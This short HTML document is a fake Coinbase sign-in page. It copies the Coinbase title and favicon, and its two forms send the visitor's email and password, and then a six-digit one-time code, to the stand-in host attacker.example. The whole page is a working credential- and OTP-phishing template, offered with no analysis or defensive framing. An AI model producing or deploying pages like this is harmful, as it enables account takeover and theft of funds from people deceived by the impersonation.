<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Coinbase — Sign in</title></head>
<body>
  <img alt="Coinbase" src="https://www.coinbase.com/favicon.ico">
  <h1>Sign in to Coinbase</h1>
  <form action="https://attacker.example/cb" method="post">
    <input type="email" name="email" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
    <button type="submit">Sign in</button>
  </form>
  <p>Recovery code? Enter it below.</p>
  <form action="https://attacker.example/cb-otp" method="post">
    <input inputmode="numeric" maxlength="6" name="otp">
    <button type="submit">Verify</button>
  </form>
</body></html>
